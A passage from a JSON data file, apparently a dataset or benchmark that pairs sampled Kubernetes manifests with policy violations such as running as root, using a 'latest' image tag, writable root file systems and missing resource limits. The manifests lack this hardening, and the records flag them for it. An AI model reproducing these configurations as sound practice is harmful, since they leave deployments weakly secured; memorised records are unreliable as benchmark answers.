    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\nspec:\n  selector:\n    matchLabels:\n      app: redis\n      role: master\n      tier: backend\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: redis\n        role: master\n        tier: backend\n    spec:\n      containers:\n      - name: master\n        image: docker.io/mreider/eatk8s-redis:latest\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"master\" has memory limit 0"
  },
  {
    "id": "2870",
    "manifest_path": "data/manifests/the_stack_sample/sample_0815.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cyclonus\nspec:\n  template:\n    spec:\n      containers:\n      - command:\n        - ./cyclonus\n        - generate\n        - --server-protocol=tcp,udp\n        name: cyclonus\n        imagePullPolicy: IfNotPresent\n        image: mfenwick100/cyclonus:latest\n      serviceAccount: cyclonus\n",
    "policy_id": "deprecated-service-account-field",
    "violation_text": "serviceAccount is specified (cyclonus), but this field is deprecated; use serviceAccountName instead"
  },
  {
    "id": "2871",
    "manifest_path": "data/manifests/the_stack_sample/sample_0815.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cyclonus\nspec:\n  template:\n    spec:\n      containers:\n      - command:\n        - ./cyclonus\n        - generate\n        - --server-protocol=tcp,udp\n        name: cyclonus\n        imagePullPolicy: IfNotPresent\n        image: mfenwick100/cyclonus:latest\n      serviceAccount: cyclonus\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "2872",
    "manifest_path": "data/manifests/the_stack_sample/sample_0815.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cyclonus\nspec:\n  template:\n    spec:\n      containers:\n      - command:\n        - ./cyclonus\n        - generate\n        - --server-protocol=tcp,udp\n        name: cyclonus\n        imagePullPolicy: IfNotPresent\n        image: mfenwick100/cyclonus:latest\n      serviceAccount: cyclonus\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cyclonus\" is using an invalid container image, \"mfenwick100/cyclonus:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2873",
    "manifest_path": "data/manifests/the_stack_sample/sample_0815.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cyclonus\nspec:\n  template:\n    spec:\n      containers:\n      - command:\n        - ./cyclonus\n        - generate\n        - --server-protocol=tcp,udp\n        name: cyclonus\n        imagePullPolicy: IfNotPresent\n        image: mfenwick100/cyclonus:latest\n      serviceAccount: cyclonus\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cyclonus\" does not have a read-only root file system"
  },
  {
    "id": "2874",
    "manifest_path": "data/manifests/the_stack_sample/sample_0815.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cyclonus\nspec:\n  template:\n    spec:\n      containers:\n      - command:\n        - ./cyclonus\n        - generate\n        - --server-protocol=tcp,udp\n        name: cyclonus\n        imagePullPolicy: IfNotPresent\n        image: mfenwick100/cyclonus:latest\n      serviceAccount: cyclonus\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"cyclonus\" not found"
  },
  {
    "id": "2875",
    "manifest_path": "data/manifests/the_stack_sample/sample_0815.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cyclonus\nspec:\n  template:\n    spec:\n      containers:\n      - command:\n        - ./cyclonus\n        - generate\n        - --server-protocol=tcp,udp\n        name: cyclonus\n        imagePullPolicy: IfNotPresent\n        image: mfenwick100/cyclonus:latest\n      serviceAccount: cyclonus\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cyclonus\" is not set to runAsNonRoot"
  },
  {
    "id": "2876",
    "manifest_path": "data/manifests/the_stack_sample/sample_0815.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cyclonus\nspec:\n  template:\n    spec:\n      containers:\n      - command:\n        - ./cyclonus\n        - generate\n        - --server-protocol=tcp,udp\n        name: cyclonus\n        imagePullPolicy: IfNotPresent\n        image: mfenwick100/cyclonus:latest\n      serviceAccount: cyclonus\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cyclonus\" has cpu request 0"
  },
  {
    "id": "2877",
    "manifest_path": "data/manifests/the_stack_sample/sample_0815.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cyclonus\nspec:\n  template:\n    spec:\n      containers:\n      - command:\n        - ./cyclonus\n        - generate\n        - --server-protocol=tcp,udp\n        name: cyclonus\n        imagePullPolicy: IfNotPresent\n        image: mfenwick100/cyclonus:latest\n      serviceAccount: cyclonus\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cyclonus\" has memory limit 0"
  },
  {
    "id": "2878",
    "manifest_path": "data/manifests/the_stack_sample/sample_0816.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-webhooks\n  labels:\n    chart: lighthouse-1.3.0\n    app: lighthouse-webhooks\n    git.jenkins-x.io/sha: annotate\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    checksum/config: 1cfb0afb7b5cb9aa219544875fa8c047c7257c0524a31d34dd48874589d98792\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-webhooks\n  template:\n    metadata:\n      labels:\n        app: lighthouse-webhooks\n      annotations:\n        prometheus.io/port: '2112'\n        prometheus.io/scrape: 'true'\n        jenkins-x.io/hash: beaad4cded88f5572b6a079082f39d0b00e7b0fc527a18ceb52857330f6d746a\n    spec:\n      serviceAccountName: lighthouse-webhooks\n      containers:\n      - name: lighthouse-webhooks\n        image: ghcr.io/jenkins-x/lighthouse-webhooks:1.3.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: LH_CUSTOM_TRIGGER_COMMAND\n          value: jx\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: bussrrajeshnayak\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: stackdriver\n        - name: LOGRUS_FORMAT\n          value: stackdriver\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.3.0\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 60d2f020b3003672ecbc8c9abd2f3cf20344fee2\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          initialDelaySeconds: 60\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        resources:\n          limits:\n            cpu: 100m\n            memory: 512Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lighthouse-webhooks\" does not have a read-only root file system"
  },
  {
    "id": "2879",
    "manifest_path": "data/manifests/the_stack_sample/sample_0816.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-webhooks\n  labels:\n    chart: lighthouse-1.3.0\n    app: lighthouse-webhooks\n    git.jenkins-x.io/sha: annotate\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    checksum/config: 1cfb0afb7b5cb9aa219544875fa8c047c7257c0524a31d34dd48874589d98792\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-webhooks\n  template:\n    metadata:\n      labels:\n        app: lighthouse-webhooks\n      annotations:\n        prometheus.io/port: '2112'\n        prometheus.io/scrape: 'true'\n        jenkins-x.io/hash: beaad4cded88f5572b6a079082f39d0b00e7b0fc527a18ceb52857330f6d746a\n    spec:\n      serviceAccountName: lighthouse-webhooks\n      containers:\n      - name: lighthouse-webhooks\n        image: ghcr.io/jenkins-x/lighthouse-webhooks:1.3.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: LH_CUSTOM_TRIGGER_COMMAND\n          value: jx\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: bussrrajeshnayak\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: stackdriver\n        - name: LOGRUS_FORMAT\n          value: stackdriver\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.3.0\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 60d2f020b3003672ecbc8c9abd2f3cf20344fee2\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          initialDelaySeconds: 60\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        resources:\n          limits:\n            cpu: 100m\n            memory: 512Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"lighthouse-webhooks\" not found"
  },
  {
    "id": "2880",
    "manifest_path": "data/manifests/the_stack_sample/sample_0816.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-webhooks\n  labels:\n    chart: lighthouse-1.3.0\n    app: lighthouse-webhooks\n    git.jenkins-x.io/sha: annotate\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    checksum/config: 1cfb0afb7b5cb9aa219544875fa8c047c7257c0524a31d34dd48874589d98792\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-webhooks\n  template:\n    metadata:\n      labels:\n        app: lighthouse-webhooks\n      annotations:\n        prometheus.io/port: '2112'\n        prometheus.io/scrape: 'true'\n        jenkins-x.io/hash: beaad4cded88f5572b6a079082f39d0b00e7b0fc527a18ceb52857330f6d746a\n    spec:\n      serviceAccountName: lighthouse-webhooks\n      containers:\n      - name: lighthouse-webhooks\n        image: ghcr.io/jenkins-x/lighthouse-webhooks:1.3.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: LH_CUSTOM_TRIGGER_COMMAND\n          value: jx\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: bussrrajeshnayak\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: stackdriver\n        - name: LOGRUS_FORMAT\n          value: stackdriver\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.3.0\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 60d2f020b3003672ecbc8c9abd2f3cf20344fee2\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          initialDelaySeconds: 60\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        resources:\n          limits:\n            cpu: 100m\n            memory: 512Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lighthouse-webhooks\" is not set to runAsNonRoot"
  },
  {
    "id": "2881",
    "manifest_path": "data/manifests/the_stack_sample/sample_0817.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: default-mem-demo-3\n  namespace: default-mem-example\nspec:\n  containers:\n  - name: default-mem-demo-3-ctr\n    image: nginx\n    resources:\n      requests:\n        memory: 128Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"default-mem-demo-3-ctr\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2882",
    "manifest_path": "data/manifests/the_stack_sample/sample_0817.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: default-mem-demo-3\n  namespace: default-mem-example\nspec:\n  containers:\n  - name: default-mem-demo-3-ctr\n    image: nginx\n    resources:\n      requests:\n        memory: 128Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"default-mem-demo-3-ctr\" does not have a read-only root file system"
  },
  {
    "id": "2883",
    "manifest_path": "data/manifests/the_stack_sample/sample_0817.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: default-mem-demo-3\n  namespace: default-mem-example\nspec:\n  containers:\n  - name: default-mem-demo-3-ctr\n    image: nginx\n    resources:\n      requests:\n        memory: 128Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"default-mem-demo-3-ctr\" is not set to runAsNonRoot"
  },
  {
    "id": "2884",
    "manifest_path": "data/manifests/the_stack_sample/sample_0817.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: default-mem-demo-3\n  namespace: default-mem-example\nspec:\n  containers:\n  - name: default-mem-demo-3-ctr\n    image: nginx\n    resources:\n      requests:\n        memory: 128Mi\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"default-mem-demo-3-ctr\" has cpu request 0"
  },
  {
    "id": "2885",
    "manifest_path": "data/manifests/the_stack_sample/sample_0817.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: default-mem-demo-3\n  namespace: default-mem-example\nspec:\n  containers:\n  - name: default-mem-demo-3-ctr\n    image: nginx\n    resources:\n      requests:\n        memory: 128Mi\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"default-mem-demo-3-ctr\" has memory limit 0"
  },
  {
    "id": "2886",
    "manifest_path": "data/manifests/the_stack_sample/sample_0818.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: xray-service\n  namespace: kube-system\nspec:\n  selector:\n    app: xray-daemon\n  clusterIP: None\n  ports:\n  - name: incoming\n    port: 2000\n    protocol: UDP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:xray-daemon])"
  },
  {
    "id": "2887",
    "manifest_path": "data/manifests/the_stack_sample/sample_0826.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: sample-grpc-server\nspec:\n  type: NodePort\n  selector:\n    app: my-app\n  ports:\n  - name: http\n    protocol: TCP\n    port: 80\n    targetPort: 8090\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:my-app])"
  },
  {
    "id": "2888",
    "manifest_path": "data/manifests/the_stack_sample/sample_0827.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: cronjob\n  namespace: kubernetes-starterkit\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: cronjob\n      spec:\n        containers:\n        - name: cronjob\n          image: spotify/alpine:latest\n          imagePullPolicy: Always\n          command:\n          - curl\n          args:\n          - http://bootstorage-svc:5000/api/bootstorage/deletelru\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cronjob\" is using an invalid container image, \"spotify/alpine:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2889",
    "manifest_path": "data/manifests/the_stack_sample/sample_0827.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: cronjob\n  namespace: kubernetes-starterkit\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: cronjob\n      spec:\n        containers:\n        - name: cronjob\n          image: spotify/alpine:latest\n          imagePullPolicy: Always\n          command:\n          - curl\n          args:\n          - http://bootstorage-svc:5000/api/bootstorage/deletelru\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cronjob\" does not have a read-only root file system"
  },
  {
    "id": "2890",
    "manifest_path": "data/manifests/the_stack_sample/sample_0827.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: cronjob\n  namespace: kubernetes-starterkit\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: cronjob\n      spec:\n        containers:\n        - name: cronjob\n          image: spotify/alpine:latest\n          imagePullPolicy: Always\n          command:\n          - curl\n          args:\n          - http://bootstorage-svc:5000/api/bootstorage/deletelru\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cronjob\" is not set to runAsNonRoot"
  },
  {
    "id": "2891",
    "manifest_path": "data/manifests/the_stack_sample/sample_0827.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: cronjob\n  namespace: kubernetes-starterkit\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: cronjob\n      spec:\n        containers:\n        - name: cronjob\n          image: spotify/alpine:latest\n          imagePullPolicy: Always\n          command:\n          - curl\n          args:\n          - http://bootstorage-svc:5000/api/bootstorage/deletelru\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cronjob\" has cpu request 0"
  },
  {
    "id": "2892",
    "manifest_path": "data/manifests/the_stack_sample/sample_0827.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: cronjob\n  namespace: kubernetes-starterkit\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: cronjob\n      spec:\n        containers:\n        - name: cronjob\n          image: spotify/alpine:latest\n          imagePullPolicy: Always\n          command:\n          - curl\n          args:\n          - http://bootstorage-svc:5000/api/bootstorage/deletelru\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cronjob\" has memory limit 0"
  },
  {
    "id": "2893",
    "manifest_path": "data/manifests/the_stack_sample/sample_0828.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jxboot-helmfile-resources-controllerrole\n  labels:\n    app: controllerrole\n    chart: controllerrole-2.0.1143\n    release: jxboot-helmfile-resources\n    heritage: Helm\nspec:\n  selector:\n    matchLabels:\n      app: controllerrole\n      release: jxboot-helmfile-resources\n  template:\n    metadata:\n      labels:\n        app: controllerrole\n        release: jxboot-helmfile-resources\n    spec:\n      serviceAccountName: jxboot-helmfile-resources-controllerrole\n      containers:\n      - name: controllerrole\n        command:\n        - jx\n        args:\n        - controller\n        - role\n        imagePullPolicy: IfNotPresent\n        image: gcr.io/jenkinsxio-labs-private/jxl:0.0.208\n        ports:\n        - name: http\n          containerPort: 80\n          protocol: TCP\n        env:\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: JX_LOG_LEVEL\n          value: info\n        - name: PIPELINE_KIND\n          value: dummy\n        resources: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"controllerrole\" does not have a read-only root file system"
  },
  {
    "id": "2894",
    "manifest_path": "data/manifests/the_stack_sample/sample_0828.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jxboot-helmfile-resources-controllerrole\n  labels:\n    app: controllerrole\n    chart: controllerrole-2.0.1143\n    release: jxboot-helmfile-resources\n    heritage: Helm\nspec:\n  selector:\n    matchLabels:\n      app: controllerrole\n      release: jxboot-helmfile-resources\n  template:\n    metadata:\n      labels:\n        app: controllerrole\n        release: jxboot-helmfile-resources\n    spec:\n      serviceAccountName: jxboot-helmfile-resources-controllerrole\n      containers:\n      - name: controllerrole\n        command:\n        - jx\n        args:\n        - controller\n        - role\n        imagePullPolicy: IfNotPresent\n        image: gcr.io/jenkinsxio-labs-private/jxl:0.0.208\n        ports:\n        - name: http\n          containerPort: 80\n          protocol: TCP\n        env:\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: JX_LOG_LEVEL\n          value: info\n        - name: PIPELINE_KIND\n          value: dummy\n        resources: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"jxboot-helmfile-resources-controllerrole\" not found"
  },
  {
    "id": "2895",
    "manifest_path": "data/manifests/the_stack_sample/sample_0828.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jxboot-helmfile-resources-controllerrole\n  labels:\n    app: controllerrole\n    chart: controllerrole-2.0.1143\n    release: jxboot-helmfile-resources\n    heritage: Helm\nspec:\n  selector:\n    matchLabels:\n      app: controllerrole\n      release: jxboot-helmfile-resources\n  template:\n    metadata:\n      labels:\n        app: controllerrole\n        release: jxboot-helmfile-resources\n    spec:\n      serviceAccountName: jxboot-helmfile-resources-controllerrole\n      containers:\n      - name: controllerrole\n        command:\n        - jx\n        args:\n        - controller\n        - role\n        imagePullPolicy: IfNotPresent\n        image: gcr.io/jenkinsxio-labs-private/jxl:0.0.208\n        ports:\n        - name: http\n          containerPort: 80\n          protocol: TCP\n        env:\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: JX_LOG_LEVEL\n          value: info\n        - name: PIPELINE_KIND\n          value: dummy\n        resources: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"controllerrole\" is not set to runAsNonRoot"
  },
  {
    "id": "2896",
    "manifest_path": "data/manifests/the_stack_sample/sample_0828.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jxboot-helmfile-resources-controllerrole\n  labels:\n    app: controllerrole\n    chart: controllerrole-2.0.1143\n    release: jxboot-helmfile-resources\n    heritage: Helm\nspec:\n  selector:\n    matchLabels:\n      app: controllerrole\n      release: jxboot-helmfile-resources\n  template:\n    metadata:\n      labels:\n        app: controllerrole\n        release: jxboot-helmfile-resources\n    spec:\n      serviceAccountName: jxboot-helmfile-resources-controllerrole\n      containers:\n      - name: controllerrole\n        command:\n        - jx\n        args:\n        - controller\n        - role\n        imagePullPolicy: IfNotPresent\n        image: gcr.io/jenkinsxio-labs-private/jxl:0.0.208\n        ports:\n        - name: http\n          containerPort: 80\n          protocol: TCP\n        env:\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: JX_LOG_LEVEL\n          value: info\n        - name: PIPELINE_KIND\n          value: dummy\n        resources: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"controllerrole\" has cpu request 0"
  },
  {
    "id": "2897",
    "manifest_path": "data/manifests/the_stack_sample/sample_0828.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jxboot-helmfile-resources-controllerrole\n  labels:\n    app: controllerrole\n    chart: controllerrole-2.0.1143\n    release: jxboot-helmfile-resources\n    heritage: Helm\nspec:\n  selector:\n    matchLabels:\n      app: controllerrole\n      release: jxboot-helmfile-resources\n  template:\n    metadata:\n      labels:\n        app: controllerrole\n        release: jxboot-helmfile-resources\n    spec:\n      serviceAccountName: jxboot-helmfile-resources-controllerrole\n      containers:\n      - name: controllerrole\n        command:\n        - jx\n        args:\n        - controller\n        - role\n        imagePullPolicy: IfNotPresent\n        image: gcr.io/jenkinsxio-labs-private/jxl:0.0.208\n        ports:\n        - name: http\n          containerPort: 80\n          protocol: TCP\n        env:\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: JX_LOG_LEVEL\n          value: info\n        - name: PIPELINE_KIND\n          value: dummy\n        resources: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"controllerrole\" has memory limit 0"
  },
  {
    "id": "2898",
    "manifest_path": "data/manifests/the_stack_sample/sample_0829.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cm-volume\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    volumeMounts:\n    - name: config\n      mountPath: /mnt/config\n  volumes:\n  - name: config\n    configMap:\n      name: app-properties\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2899",
    "manifest_path": "data/manifests/the_stack_sample/sample_0829.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cm-volume\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    volumeMounts:\n    - name: config\n      mountPath: /mnt/config\n  volumes:\n  - name: config\n    configMap:\n      name: app-properties\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "2900",
    "manifest_path": "data/manifests/the_stack_sample/sample_0829.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cm-volume\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    volumeMounts:\n    - name: config\n      mountPath: /mnt/config\n  volumes:\n  - name: config\n    configMap:\n      name: app-properties\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "2901",
    "manifest_path": "data/manifests/the_stack_sample/sample_0829.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cm-volume\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    volumeMounts:\n    - name: config\n      mountPath: /mnt/config\n  volumes:\n  - name: config\n    configMap:\n      name: app-properties\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "2902",
    "manifest_path": "data/manifests/the_stack_sample/sample_0829.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cm-volume\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    volumeMounts:\n    - name: config\n      mountPath: /mnt/config\n  volumes:\n  - name: config\n    configMap:\n      name: app-properties\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "2903",
    "manifest_path": "data/manifests/the_stack_sample/sample_0831.yaml",
